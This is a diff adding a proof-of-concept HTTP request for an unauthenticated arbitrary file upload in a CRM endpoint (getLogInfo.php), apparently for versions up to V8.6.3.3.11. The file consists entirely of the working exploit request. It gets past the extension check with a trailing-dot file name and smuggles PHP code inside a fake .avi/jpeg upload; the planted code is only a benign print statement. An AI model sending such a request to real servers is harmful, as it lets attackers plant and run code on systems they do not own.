@@ -1,0 +1,14 @@
+<=V8.6.3.3.11
+
+POST /crm/WeiXinApp/CallRecordLog/getLogInfo.php?userid=&gettype=uploadfile&uploadfilename=221.php......&callednumber=&sessionvalue=ca6ee37ed4ea2c709b2d36d1349cacff HTTP/1.1
+Host: your-ip
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="uploaded_file"; filename="123321.avi"
+Content-Type: image/jpeg
+
+<?php
+print "Hello, World!";
+?>
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
